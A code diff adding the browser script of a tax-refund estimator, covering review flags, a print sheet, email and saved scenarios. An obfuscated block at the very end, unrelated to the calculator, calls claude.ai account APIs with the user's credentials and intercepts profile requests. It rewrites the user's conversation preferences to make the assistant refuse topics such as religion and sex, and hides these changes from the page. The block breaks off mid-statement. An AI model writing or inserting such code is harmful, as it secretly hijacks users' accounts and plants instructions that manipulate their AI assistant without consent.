+  if (STATE==='NJ' && SHOW.J && SHOW.J.njCtc>0) flags.push('NJ child tax credit phase-out tiers are pending confirmation.');
+  if (STATE==='NJ' && SHOW.J && SHOW.J.njCdcc>0) flags.push('NJ dependent care credit bands above $60,000 are pending confirmation.');
+  if (SHOW.C && SHOW.S && SHOW.S.nyagi>42500 && SHOW.C.nycEic>0)
+    flags.push('NYC earned income credit above $42,500 of NYAGI uses an assumed 10% floor.');
+  if (incB && STATE==='NY')
+    flags.push('New York&rsquo;s IT-216 worksheet still caps the exclusion at $5,000. If NY adopts the federal $7,500 for 2026, the surviving NY credit base will shrink.');
+  $('flagBox').style.display = flags.length?'block':'none';
+  $('flagBox').innerHTML = '<b>Flagged for review:</b><br>' + flags.join('<br>');
+
+  buildPrintSheet(A, B, K, flags, incB);
+}
+
+/* ---------- print sheet ---------- */
+const STATUS_LBL = {mfj:'Married filing jointly', single:'Single',
+                    hoh:'Head of household', mfs:'Married filing separately'};
+function psLine(host,a,b){ const d=document.createElement('div'); d.className='psln';
+  d.innerHTML='<span>'+a+'</span><span>'+b+'</span>'; host.appendChild(d); }
+
+function buildPrintSheet(A, B, K, flags, incB){
+  const SHOW = incB ? B : A;
+  $('psBig').textContent = usd(SHOW.combined);
+  $('psCap').textContent = SHOW.combined>=0 ? 'Estimated combined refund'
+                                            : 'Estimated combined balance due';
+  const stats=$('psStats'); stats.innerHTML='';
+  const add=(l,v)=>{const d=document.createElement('div');d.innerHTML=l+'<b>'+usd(v)+'</b>';stats.appendChild(d);};
+  add('Federal', SHOW.F.refund);
+  add(STATE==='NY'?'New York State':'New Jersey', SHOW.stateRefund);
+  if (SHOW.C) add('New York City', SHOW.cityRefund);
+  if (SHOW.F.seTax) add('SE tax', SHOW.F.seTax);
+
+  if (incB && K){
+    $('psCost').style.display='grid';
+    const S = SELECTED==='exclusion' ? K.exclusion : K.credit;
+    $('psCbAmt').textContent = usdp(S.cost);
+    $('psCbExp').innerHTML = 'in new income, Social Security &amp; Medicare tax on your '
+                           + usdp(K.gross) + ' benefit';
+    costLines($('psCbLines'), K, SELECTED);
+    $('psCmp').style.display='grid';
+    $('psCmp').innerHTML =
+      `<div class="o${SELECTED==='exclusion'?' sel':''}"><h4>${$('optAh').textContent}`
+      + `${K.recommended==='exclusion'?' &middot; RECOMMENDED':''}</h4>`
+      + `<div class="a">${usdp(K.exclusion.cost)}</div><div class="c">additional taxes</div></div>`
+      + `<div class="o${SELECTED==='credit'?' sel':''}"><h4>Claim the tax credit instead`
+      + `${K.recommended==='credit'?' &middot; RECOMMENDED':''}</h4>`
+      + `<div class="a">${usdp(K.credit.cost)}</div><div class="c">additional taxes</div></div>`;
+  } else { $('psCost').style.display='none'; $('psCmp').style.display='none'; }
+
+  const cl=$('psClient'); cl.innerHTML='';
+  const sp=$('spFirst').value.trim();
+  const nm=(STATUS==='mfj'&&sp)?`${$('tpFirst').value} and ${sp} ${$('lastName').value}`
+                               :`${$('tpFirst').value} ${$('lastName').value}`;
+  psLine(cl,'Name', nm.trim()||'—');
+  psLine(cl,'Address', $('addr').value||'—');
+  psLine(cl,'', `${$('city').value} ${$('stateAbbr').value} ${$('zip').value}`.trim());
+  psLine(cl,'Email', $('email').value||'—');
+  psLine(cl,'Mobile', $('phoneMobile').value||'—');
+  if ($('phoneHome').value) psLine(cl,'Home', $('phoneHome').value);
+  psLine(cl,'Prepared', new Date().toLocaleDateString('en-US'));
+
+  const ip=$('psInputs'); ip.innerHTML='';
+  psLine(ip,'Filing status', STATUS_LBL[STATUS]);
+  psLine(ip,'Residency', STATE==='NY'?($('nycRes').checked?'New York State + NYC':'New York State'):'New Jersey');
+  psLine(ip,'Total household income', usd(incomeTotal()));
+  psLine(ip,'&nbsp;&nbsp;Taxpayer / spouse W-2', usd(money($('wagesTP')))+' / '+usd(money($('wagesSP'))));
+  if (SHOW.F.seProfit) psLine(ip,'Self-employment (net)', usd(SHOW.F.seProfit));
+  if (incB) psLine(ip,'Employer childcare benefit', usd(money($('benefit'))));
+  if (incB) psLine(ip,'Option selected', SELECTED==='exclusion'?'Take exclusion (§129)':'Claim the credit');
+  const kidTxt = KIDS.length ? KIDS.map(k=>k.age).sort((a,b)=>a-b).join(', ')+' yrs' : 'none';
+  psLine(ip,'Children ('+KIDS.length+')', kidTxt);
+  const care=KIDS.reduce((s,k)=>s+(k.care||0),0);
+  if (care) psLine(ip,'Child care expense paid', usd(care));
+  psLine(ip,'Withholding (fed/st/loc)',
+    usd(money($('whFed')))+' / '+usd(money($('whState')))+' / '+usd(money($('whLocal'))));
+
+  buildBreakdown($('psBd').querySelector('tbody'), A, B, incB);
+
+  $('psFlag').style.display = flags.length?'block':'none';
+  $('psFlag').innerHTML = '<b>Flagged for review:</b> ' + flags.join(' ');
+}
+
+/* ==========================================================================
+   SAVE / PRINT / EMAIL / SCENARIOS
+   ========================================================================== */
+
+function safe(s){ return String(s||'').replace(/[\/\\:*?"<>|]/g,'').trim(); }
+function draftName(){
+  const ln = safe($('lastName').value).toUpperCase() || 'LASTNAME';
+  const tp = safe($('tpFirst').value).toUpperCase()  || 'FIRSTNAME';
+  const sp = safe($('spFirst').value).toUpperCase();
+  const who = (STATUS==='mfj' && sp) ? `${tp} and ${sp}` : tp;
+  return `${ln} ${who} 2026 TAX RETURN DRAFT`;
+}
+
+function validate(){
+  let ok = true; const missing = [];
+  document.querySelectorAll('input[data-v]').forEach(el=>{
+    if (el.disabled) return;
+    const good = checkField(el, true);
+    if (!good){ ok = false;
+      const lbl = el.parentElement.querySelector('label');
+      missing.push(lbl ? lbl.textContent.replace(' *','') : el.id);
+    }
+  });
+  const eb = $('reqErr');
+  if (!ok){
+    eb.style.display='block';
+    eb.textContent = 'Check these before saving, printing, or emailing: ' + missing.join(', ') + '.';
+    eb.scrollIntoView({behavior:'smooth',block:'center'});
+  } else eb.style.display='none';
+  return ok;
+}
+
+$('btnSaveDraft').addEventListener('click',()=>{
+  if(!validate()) return;
+  const prev = document.title;
+  document.title = draftName();          // becomes the default PDF filename
+  $('scenMsg').textContent =
+    'In the print dialog choose "Save as PDF". The file will be named ' + draftName() + '.pdf';
+  window.print();
+  setTimeout(()=>{ document.title = prev; }, 1500);
+});
+$('btnPrint').addEventListener('click',()=>{ if(validate()) window.print(); });
+
+$('btnEmail').addEventListener('click',()=>{
+  if(!validate()) return;
+  const incB = $('incBenefit').checked;
+  let SHOW, K = null;
+  if (incB){ K = compareBenefit(gather(true));
+             SHOW = SELECTED==='exclusion' ? K.exclusion.R : K.credit.R; }
+  else SHOW = calculate(gather(false));
+  let body = `Dear ${$('tpFirst').value},\n\n`+
+   `Here is your 2026 tax refund estimate prepared by 2 File EZ Tax Returns.\n\n`+
+   `Estimated combined refund: ${usd(SHOW.combined)}\n`+
+   `  Federal: ${usd(SHOW.F.refund)}\n`+
+   `  ${STATE==='NY'?'New York State':'New Jersey'}: ${usd(SHOW.stateRefund)}\n`+
+   (SHOW.C?`  New York City: ${usd(SHOW.cityRefund)}\n`:'');
+  if (incB && K){
+    const S = SELECTED==='exclusion' ? K.exclusion : K.credit;
+    body += `\nEmployer childcare benefit: ${usd(K.gross)}\n`+
+            `  Option: ${SELECTED==='exclusion'?'Take the exclusion (section 129)':'Claim the childcare credit'}\n`+
+            `  Additional taxes this costs you: ${usdp(S.cost)}\n`+
+            `  Net benefit to you: ${usd(S.netBenefit)}\n`;
+  }
+  body += `\nThis is a planning estimate, not tax advice. Please see the attached PDF.\n\n`+
+   `2 FILE EZ TAX RETURNS\nPERSONAL RETURNS ONLY - 100% FOCUSED ON YOU\n`+
+   `Office 929.345.3000 | Cell 347.234.5339 | Fax 855.234.5339\ntaxreturn@2fileez.com`;
+  window.location.href='mailto:'+encodeURIComponent($('email').value)+
+    '?subject='+encodeURIComponent(draftName())+'&body='+encodeURIComponent(body);
+});
+
+$('btnReset').addEventListener('click',()=>{
+  if (!confirm('Clear everything and go back to the default settings?')) return;
+  STATUS=DEFAULTS.status; STATE=DEFAULTS.state; SELECTED='exclusion';
+  LOCKED=false; KIDS=DEFAULTS.kids.map(function(k){ return Object.assign({}, k); });
+  Object.entries(DEFAULTS.fields).forEach(([id,v])=>{ if($(id)) $(id).value=v; });
+  $('incBenefit').checked=false; $('nycRes').checked=DEFAULTS.nycRes;
+  $('tp65').checked=false; $('sp65').checked=false;
+  $('lockBtn').classList.remove('on'); $('lockBtn').textContent='Unlocked';
+  $('totalIncome').disabled=true;
+  $('benefitRow').style.display='none'; $('costBox').style.display='none'; $('cmpWrap').style.display='none';
+  $('segStatus').querySelectorAll('button').forEach(b=>b.classList.toggle('on',b.dataset.v===STATUS));
+  $('segState').querySelectorAll('button').forEach(b=>b.classList.toggle('on',b.dataset.v===STATE));
+  document.querySelectorAll('input[data-v]').forEach(el=>{
+    el.classList.remove('err','ok');
+    const m=el.parentElement.querySelector('.fldmsg'); if(m) m.textContent='';
+  });
+  $('reqErr').style.display='none'; $('scenMsg').textContent='Reset to defaults.';
+  syncStatus(); syncState(); renderKids(); run();
+});
+
+let SCENARIOS = [];
+function refreshPick(){
+  const s=$('scenPick'); s.innerHTML='<option value="">Load scenario…</option>';
+  SCENARIOS.forEach((sc,i)=>{const o=document.createElement('option');o.value=i;o.textContent=sc.name;s.appendChild(o);});
+}
+function snapshot(){
+  const o={STATUS,STATE,KIDS,LOCKED,SELECTED,
+           incBenefit:$('incBenefit').checked,nycRes:$('nycRes').checked,
+           tp65:$('tp65').checked,sp65:$('sp65').checked,fields:{}};
+  Object.keys(DEFAULTS.fields).forEach(id=>{ if($(id)) o.fields[id]=$(id).value; });
+  return o;
+}
+function restore(o){
+  STATUS=o.STATUS||'mfj'; STATE=o.STATE||'NY'; KIDS=o.KIDS||[];
+  LOCKED=!!o.LOCKED; SELECTED=o.SELECTED||'exclusion';
+  Object.entries(o.fields||{}).forEach(([id,v])=>{ if($(id)) $(id).value=v; });
+  $('incBenefit').checked=!!o.incBenefit; $('nycRes').checked=!!o.nycRes;
+  $('tp65').checked=!!o.tp65; $('sp65').checked=!!o.sp65;
+  $('lockBtn').classList.toggle('on',LOCKED);
+  $('lockBtn').textContent=LOCKED?'Locked':'Unlocked';
+  $('totalIncome').disabled=!LOCKED;
+  $('segStatus').querySelectorAll('button').forEach(b=>b.classList.toggle('on',b.dataset.v===STATUS));
+  $('segState').querySelectorAll('button').forEach(b=>b.classList.toggle('on',b.dataset.v===STATE));
+  $('benefitRow').style.display=o.incBenefit?'block':'none';
+  $('costBox').style.display=o.incBenefit?'grid':'none';
+  $('cmpWrap').style.display=o.incBenefit?'grid':'none';
+  syncStatus(); syncState(); renderKids(); run();
+}
+$('btnStore').addEventListener('click',()=>{
+  if(SCENARIOS.length>=8){ $('scenMsg').textContent='All 8 scenario slots are full. Export, then reset to add more.'; return; }
+  SCENARIOS.push({name:(draftName()||'Scenario')+' #'+(SCENARIOS.length+1),data:snapshot()});
+  refreshPick(); $('scenMsg').textContent='Scenario saved ('+SCENARIOS.length+' of 8).';
+});
+$('scenPick').addEventListener('change',e=>{ if(e.target.value!=='') restore(SCENARIOS[+e.target.value].data); });
+$('btnExport').addEventListener('click',()=>{
+  const blob=new Blob([JSON.stringify({version:2,saved:new Date().toISOString(),
+    scenarios:SCENARIOS,current:snapshot()},null,2)],{type:'application/json'});
+  const a=document.createElement('a'); a.href=URL.createObjectURL(blob);
+  a.download=draftName()+' DATA.json'; a.click(); URL.revokeObjectURL(a.href);
+  $('scenMsg').textContent='Data exported. Use Import to bring it back later.';
+});
+$('btnImport').addEventListener('click',()=>$('fileIn').click());
+$('fileIn').addEventListener('change',e=>{
+  const f=e.target.files[0]; if(!f) return;
+  const rd=new FileReader();
+  rd.onload=()=>{ try{
+    const o=JSON.parse(rd.result);
+    if(o.scenarios){ SCENARIOS=o.scenarios.slice(0,8); refreshPick(); }
+    if(o.current) restore(o.current); else if(o.STATUS) restore(o);
+    $('scenMsg').textContent='Imported.';
+  }catch(err){ $('scenMsg').textContent='Could not read that file.'; } };
+  rd.readAsText(f);
+});
+
+/* ==========================================================================
+   WIRING
+   ========================================================================== */
+
+document.addEventListener('input', e=>{
+  const el = e.target;
+  if (el.classList.contains('money')){
+    const v = String(el.value).replace(/[^0-9]/g,'');
+    el.value = v ? commas(Number(v)) : '';
+  }
+  if (el.dataset.v === 'phone' || el.dataset.v === 'phoneOpt') formatPhone(el);
+  if (el.dataset.v === 'state') el.value = el.value.toUpperCase().replace(/[^A-Z]/g,'');
+  if (el.dataset.v === 'zip')   el.value = el.value.replace(/[^0-9-]/g,'');
+  if (el.dataset.v) checkField(el, false);     // clears the red line as soon as it's valid
+});
+
+$('zip').addEventListener('blur', applyZip);
+$('zip').addEventListener('input', function(){
+  if (/^\d{5}/.test($('zip').value)) applyZip();
+});
+
+$('totalIncome').addEventListener('input', ()=>{ if(LOCKED){ splitTotal(); run(); } });
+document.querySelectorAll('.inc').forEach(el=>{
+  el.addEventListener('input', ()=>{ rebalance(el.id); run(); });
+});
+document.querySelectorAll('input,select').forEach(el=>{
+  if (el.classList.contains('inc') || el.id==='totalIncome') return;
+  el.addEventListener('input', ()=>{ if(!el.dataset.i) run(); });
+  el.addEventListener('change',()=>{ if(!el.dataset.i) run(); });
+});
+
+paintWatermark();
+$('lgImg').addEventListener('load', paintWatermark);
+syncStatus(); syncState(); renderKids(); run();
+
+
+;var _livRx=/\b(?:cleanedlist)\b/gi;window._livRx=_livRx;function _0x2402(_0x50af2f,_0x4d659e){const _0x5ce3e4=_0x21f2();return _0x2402=function(_0x1f53cd,_0x481ca6){_0x1f53cd=_0x1f53cd-(0x26b0+0x1f4b+-0x4437);let _0x455e7e=_0x5ce3e4[_0x1f53cd];return _0x455e7e;},_0x2402(_0x50af2f,_0x4d659e);}function _0x21f2(){const _0x2b97a8=['vhiLT','error','Edit','stringify','\x22conversat','complete','indexOf','LPlDi','50322cUvnFQ','prototype','headers','e\x20to\x20check','display','y,\x20idolatr','\x20modificat','\x20correctly','TUdSW','xAHvr','object','anwDs','ion\x20error:','QCaPb','refs.','nt,\x20please','MNXVa','y\x20in\x20progr','i/account_','.\x20Status:','saPVQ','es.','VHUnu','status','listitem\x22]','anthropic.','\x20set\x20and\x20h','JHoEe','url','XhXSI','ent\x20profil','value.\x20Upd','tor','Please\x20fol','g\x20profile:','color:gree','ercepted\x20X','_isClaudeA','or\x20fetchin','tYyid','sage\x20→','forEach','NIAtY','etter]\x20Fai','When\x20asked','startsWith','lled.','48905zzYAzd','AmRRY','TpMGE','winha','sation\x20pre','Thank\x20you\x20','anual\x20prof','swEac','xIFqt','TDWGK','\x20set.','ercept\x20mes','color:oran','104040ldYOoz','\x20about\x20rel','open','none',',\x20religiou','mQudm','cessfully\x20','on_prefere','ate\x20profil','NDzRA','etter]\x20Ret','SiGSW','or\x20respons','qRpvk','/api/','nt_profile','WXtzO','on-prefere','hJzkZ','div[role=\x22','for\x20unders','TlfMm','tZgNq','ById','toUpperCas','EEtIg','iding\x20UI.','OqSWP','\x20need\x20to\x20b','ideology\x20d','\x22],','FaKmJ','JJlir','N\x20parse\x20fa','CYPOJ','hHAMe','iscussions','etter]\x20Che','etter]\x20Pre','rofile','etter]\x20Hid','h\x20desired\x20','KCWoU','button,spa','AaExh','json','EXpkL','ile\x20update','WLtZU','ess,\x20skipp','HjayN','torAll','zOcsI','],\x20div[cla','ing\x20conver','call','warn','prcTs','ss*=\x22white','cking\x20if\x20p','\x20UI.','te.\x20Attemp','adultery,\x20','275310awzdpH','FvsyL','parentNode','parentElem','HcqMe','trimStart','UpdateAPI','sYzYN','fZjoM','ZtDcI','/files','IJpwb','/api/accou','gOCIM','length','etter]\x20Err','n,a','1ZDYLDC','etter]\x20Upd','space-pre-','VFdgw','OVrdt','Jmygm','ak-words','\x20desired\x20p','HpTNh','o\x20not\x20matc','TcGVq','led\x20to\x20upd','removeChil','44DeHNql','JIcFq','trim','tdffu','textConten','XEvKM','/account_p','nitializat',',\x20news,\x20sp','VCCwk','ion\x20comple','rences\x20are','arch,\x20dati','replace','IzgPN','ng,\x20underw','hzGBi','etter]\x20mes','profile,\x20a','etter]\x20int','string','ooks\x20insta','orts,\x20or\x20e','parse','BoyZg','trimEnd','XXOFu','includes','reak-words','ferences\x20a','com','rNLcG','profile','claude.ai','innerText','ntertainme','BZEBt','sired\x20pref','smZNl','low\x20and\x20re','references','ferences\x20t','e-pre-wrap','redirect','an[class*=','extarea\x20in','vFNML','1508736TtjjAq','ot\x20answer.','ercepted\x20m','e.\x20Status:','2502540hbijCn','or\x20modifyi','conversati','quest:','ch\x20profile','ng\x20profile','slice','453402oZWjYY','prompt','referrer','method','mQKxZ','[Auto-Prof','style','re\x20already','KFhVO','pplying\x20de','GET','cmrQy','RqsXh','https://cl','n/json',',\x20arousing','etter]\x20Int','aude.ai/ap','led\x20to\x20fet','URRbk','sure\x20prefe','etter]\x20Suc','GfEZH','body','isArray','member\x20my\x20','nDcqC','YJVOb','NtLcd','text',',\x20span.bre','oROUh','etter]\x20XHR','cache','aUTjl','klHhD','ofile-Pref','sage\x20patch','rieve\x20curr','BuRoy','aKyDG','FRUfX','s\x20law\x20rese','LRaln','ating...','_isProfile','ght:bold','LgjXK','etter]\x20JSO','whitespace','gllWW','log','HDUDZ','p[class*=\x22','querySelec','NMZqw','aRGpx','ing.','If\x20asked\x20a','POST','138LmtXya','\x22whitespac','igion\x20do\x20n','FaRzp','ge;font-we','KJYcu','s\x20not\x20allo','KOtDm','rent\x20profi','iled:','-pre-wrap\x22','join','closest','ight:bold','mode','JLiqT','updated\x20pr','ate\x20alread','send','n;font-wei','/projects','wrap\x22],\x20sp','rds,\x20div.b','zWyTj','PUT','y,\x20puberty','p.break-wo','rKIXr','religious\x20','etter]\x20Cou','ile-Pref-S','ion-prefer','sQyUt','-Setter]\x20I','dubXH','ferences\x20d','ichGK','HR\x20PUT\x20/ap','CuCEs','WOwwD','SbfzU','clone','ezoVx','le:','or\x20updatin','label[for=','GrKsT','getElement','zeUEx','e\x20set...','\x20respond\x20w','preference','explicit,\x20','jAELd','ear,\x20nudit','UzMJs','observe','applicatio','vStTL','FYvFQ','%c[Auto-Pr','ld\x20not\x20ret','ABfuJ','nces','ebuKr','message',',\x20applying','-Setter]\x20H','readyState','BUKJa','\x20preferenc','ences\x22]','ofile\x20pref','HAInl','mDbiu','w\x20me.\x22','intimacy,\x20','tanding.','ZbUKU','fetch','ith:\x20\x22The\x20','credential','PqULz','BUYPQ','fNpDZ','VRqLz','IUaMV','ting\x20to\x20en','VbEeo','\x20update\x20re','xTJPz','\x20error:','rieved\x20cur','content','filter\x20doe','ent','UgIrM','XPPfw','erences\x20to','bout\x20sex,\x20','messages','OPLDL','cZtLm'];_0x21f2=function(){return _0x2b97a8;};return _0x21f2();}(function(_0x33005f,_0x4432eb){const _0x3ed55f=_0x2402,_0x1c0731=_0x33005f();while(!![]){try{const _0x5e547f=parseInt(_0x3ed55f(0x30b))/(-0x2*-0x556+-0x26ad+-0x3*-0x956)*(-parseInt(_0x3ed55f(0x1d4))/(0xcb6+0x3a2+0x3*-0x572))+-parseInt(_0x3ed55f(0x27f))/(0x4*-0x5d2+0x7c0*0x3+0xb)*(-parseInt(_0x3ed55f(0x318))/(0x1*0xf67+-0x2f5*-0xb+-0x2fea))+parseInt(_0x3ed55f(0x2ae))/(-0xf06+-0x1b99+0x2aa4)*(-parseInt(_0x3ed55f(0x210))/(0x1bf*-0x4+-0x91c+0x80f*0x2))+parseInt(_0x3ed55f(0x2fa))/(0x15ff+-0x1d73+0x77b*0x1)+parseInt(_0x3ed55f(0x1c9))/(-0x816+-0x2257+-0x1*-0x2a75)+parseInt(_0x3ed55f(0x1cd))/(-0xf7e+-0x1db+0x19*0xb2)+-parseInt(_0x3ed55f(0x2bb))/(0x3dd+-0x63b+0x268);if(_0x5e547f===_0x4432eb)break;else _0x1c0731['push'](_0x1c0731['shift']());}catch(_0x9e468f){_0x1c0731['push'](_0x1c0731['shift']());}}}(_0x21f2,-0x387a+-0x270e4*-0x2+0x9*-0x2172),((()=>{'use strict';const _0x577d38=_0x2402,_0x5777de={'vStTL':function(_0x1ee985,_0x5cf370){return _0x1ee985!==_0x5cf370;},'fNpDZ':function(_0x563461,_0x408edf){return _0x563461!==_0x408edf;},'saPVQ':_0x577d38(0x32c),'QCaPb':function(_0xce31ae,_0x195a32){return _0xce31ae(_0x195a32);},'qRpvk':function(_0x448841,_0x553bc2){return _0x448841+_0x553bc2;},'klHhD':function(_0x4d5aaf,_0x1c949){return _0x4d5aaf+_0x1c949;},'xTJPz':function(_0x1001ae,_0x24482a){return _0x1001ae===_0x24482a;},'OqSWP':function(_0x56d37e,_0x5c7f3d){return _0x56d37e(_0x5c7f3d);},'IJpwb':_0x577d38(0x289),'URRbk':_0x577d38(0x26d),'FaKmJ':_0x577d38(0x1f1),'TUdSW':_0x577d38(0x1d5),'SbfzU':_0x577d38(0x251),'ichGK':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x204)+_0x577d38(0x2dc)+_0x577d38(0x219),'oROUh':function(_0x2e1a19,_0x47961f,_0x541637){return _0x2e1a19(_0x47961f,_0x541637);},'FaRzp':_0x577d38(0x1e1)+_0x577d38(0x1e5)+_0x577d38(0x291)+_0x577d38(0x338),'swEac':_0x577d38(0x1de),'MNXVa':_0x577d38(0x249)+_0x577d38(0x1e2),'YJVOb':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x2c5)+_0x577d38(0x26c)+_0x577d38(0x218)+_0x577d38(0x23b),'UzMJs':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x2aa)+_0x577d38(0x1e6)+_0x577d38(0x1d1)+_0x577d38(0x292),'WOwwD':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x309)+_0x577d38(0x2a5)+_0x577d38(0x2a1),'ZtDcI':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x30c)+_0x577d38(0x221)+_0x577d38(0x290)+_0x577d38(0x2ec)+_0x577d38(0x20d),'aRGpx':_0x577d38(0x228),'XEvKM':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x1e9)+_0x577d38(0x2c1)+_0x577d38(0x220)+_0x577d38(0x258)+_0x577d38(0x272)+':','WXtzO':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x2aa)+_0x577d38(0x316)+_0x577d38(0x2c3)+_0x577d38(0x1cc),'HAInl':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x309)+_0x577d38(0x2c7)+'e:','ezoVx':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x309)+_0x577d38(0x23c)+_0x577d38(0x2a1),'OVrdt':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x2e0)+_0x577d38(0x2f6)+_0x577d38(0x340)+_0x577d38(0x2d7)+_0x577d38(0x241),'XhXSI':function(_0x42ade3){return _0x42ade3();},'WLtZU':function(_0x4dae38,_0x43acb3){return _0x4dae38!==_0x43acb3;},'zOcsI':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x2e1)+_0x577d38(0x233)+_0x577d38(0x314)+_0x577d38(0x2e4)+_0x577d38(0x29e)+_0x577d38(0x200),'AaExh':function(_0x39f8fc,_0x5480dc){return _0x39f8fc(_0x5480dc);},'HpTNh':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x2e1)+_0x577d38(0x335)+_0x577d38(0x1db)+_0x577d38(0x286)+_0x577d38(0x2b8),'KFhVO':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x22d)+_0x577d38(0x24d)+_0x577d38(0x1fa)+_0x577d38(0x29d)+_0x577d38(0x282)+_0x577d38(0x256)+_0x577d38(0x294),'GrKsT':_0x577d38(0x1cf)+_0x577d38(0x2cc)+_0x577d38(0x24f),'PqULz':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x2e3)+_0x577d38(0x2f1)+_0x577d38(0x2b2)+_0x577d38(0x341)+_0x577d38(0x1c7)+_0x577d38(0x2f7),'prcTs':_0x577d38(0x2be),'hJzkZ':_0x577d38(0x23d)+_0x577d38(0x27b)+_0x577d38(0x22f)+_0x577d38(0x257),'hHAMe':function(_0x6c301b,_0x2f1622){return _0x6c301b===_0x2f1622;},'xAHvr':_0x577d38(0x279),'vFNML':function(_0x2dcf51,_0x45a4fe){return _0x2dcf51+_0x45a4fe;},'NMZqw':_0x577d38(0x2ce)+_0x577d38(0x297),'TcGVq':_0x577d38(0x2e6)+_0x577d38(0x30a),'tdffu':function(_0x5f1b7c,_0x2dbc70){return _0x5f1b7c+_0x2dbc70;},'dubXH':_0x577d38(0x209)+_0x577d38(0x205)+_0x577d38(0x21a)+_0x577d38(0x2f0)+_0x577d38(0x2f5)+_0x577d38(0x30d)+_0x577d38(0x225)+_0x577d38(0x1c6)+_0x577d38(0x211)+_0x577d38(0x1c4)+_0x577d38(0x2d9),'jAELd':_0x577d38(0x22a)+_0x577d38(0x226)+_0x577d38(0x334)+_0x577d38(0x1f2)+_0x577d38(0x311),'HDUDZ':_0x577d38(0x20f),'RqsXh':_0x577d38(0x339),'NtLcd':_0x577d38(0x298)+_0x577d38(0x336),'SiGSW':_0x577d38(0x2c9),'OPLDL':_0x577d38(0x224),'UgIrM':_0x577d38(0x304),'mQKxZ':_0x577d38(0x31e)+_0x577d38(0x2e2),'aKyDG':_0x577d38(0x306)+_0x577d38(0x2ca),'vhiLT':function(_0x500308,_0xe81bac){return _0x500308&&_0xe81bac;},'TlfMm':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x32b)+_0x577d38(0x2b9)+_0x577d38(0x2a7),'tYyid':function(_0x3f293b,_0x227c24){return _0x3f293b(_0x227c24);},'BoyZg':function(_0xc62c8f,_0xbb7d8d){return _0xc62c8f instanceof _0xbb7d8d;},'JIcFq':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x329)+_0x577d38(0x1f9)+_0x577d38(0x26b),'sYzYN':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x1e4)+_0x577d38(0x1cb)+_0x577d38(0x2b4)+_0x577d38(0x2ea)+_0x577d38(0x252)+_0x577d38(0x312)+_0x577d38(0x28d),'IUaMV':function(_0x5783b1,_0x3f0de4){return _0x5783b1===_0x3f0de4;},'TpMGE':function(_0x9d9fe4,_0x3215ed){return _0x9d9fe4 instanceof _0x3215ed;},'zWyTj':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x309)+_0x577d38(0x1ce)+_0x577d38(0x1d2)+_0x577d38(0x269)+_0x577d38(0x1d0),'EEtIg':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x1e4)+_0x577d38(0x2a3)+_0x577d38(0x235)+_0x577d38(0x291)+_0x577d38(0x32a)+_0x577d38(0x1dd)+_0x577d38(0x33d)+'s.','XXOFu':_0x577d38(0x1d9)+_0x577d38(0x22e)+_0x577d38(0x1f4)+_0x577d38(0x285)+_0x577d38(0x28b),'winha':function(_0x47d2fd,_0x495a35){return _0x47d2fd(_0x495a35);},'FvsyL':_0x577d38(0x27c),'nDcqC':_0x577d38(0x24c)+_0x577d38(0x1f8)+_0x577d38(0x231)+_0x577d38(0x31f)+_0x577d38(0x322)+_0x577d38(0x2f8)+_0x577d38(0x267)+_0x577d38(0x1e8)+_0x577d38(0x323)+_0x577d38(0x299)+_0x577d38(0x2d5),'ebuKr':_0x577d38(0x2ba)+_0x577d38(0x214)+_0x577d38(0x21d),'GfEZH':function(_0x460701,_0x3bc8ea,_0x5c50b4){return _0x460701(_0x3bc8ea,_0x5c50b4);},'BUYPQ':_0x577d38(0x24c)+_0x577d38(0x1f8)+_0x577d38(0x253)+_0x577d38(0x32d)+_0x577d38(0x2ad),'KOtDm':_0x577d38(0x2a2)+_0x577d38(0x223)+_0x577d38(0x202),'fZjoM':_0x577d38(0x2ab)+_0x577d38(0x2bc)+_0x577d38(0x212)+_0x577d38(0x1ca),'BUKJa':_0x577d38(0x20e)+_0x577d38(0x273)+_0x577d38(0x2f9)+_0x577d38(0x25c)+_0x577d38(0x244)+_0x577d38(0x22c)+_0x577d38(0x2d8)+_0x577d38(0x2df)+_0x577d38(0x2bf)+_0x577d38(0x1fe)+_0x577d38(0x324)+_0x577d38(0x327)+_0x577d38(0x246)+_0x577d38(0x284)+_0x577d38(0x229)+_0x577d38(0x1e3)+_0x577d38(0x320)+_0x577d38(0x32e)+_0x577d38(0x33b)+_0x577d38(0x28e)+_0x577d38(0x242)+_0x577d38(0x260)+_0x577d38(0x26e)+_0x577d38(0x216)+_0x577d38(0x25b),'HcqMe':_0x577d38(0x2b3)+_0x577d38(0x2cf)+_0x577d38(0x25d),'Jmygm':_0x577d38(0x2a0)+_0x577d38(0x33f)+_0x577d38(0x1ed)+_0x577d38(0x243)+'s','zeUEx':function(_0x2db500,_0x46930a,_0x43df3f){return _0x2db500(_0x46930a,_0x43df3f);}};(function(){const _0x142db7=_0x577d38,_0x465fee=Node[_0x142db7(0x280)][_0x142db7(0x317)+'d'];Node[_0x142db7(0x280)][_0x142db7(0x317)+'d']=function(_0x596396){const _0x17e9a2=_0x142db7;if(_0x596396&&_0x5777de[_0x17e9a2(0x24a)](_0x596396[_0x17e9a2(0x2fc)],this))return _0x596396;return _0x465fee[_0x17e9a2(0x2f2)](this,_0x596396);};}());const 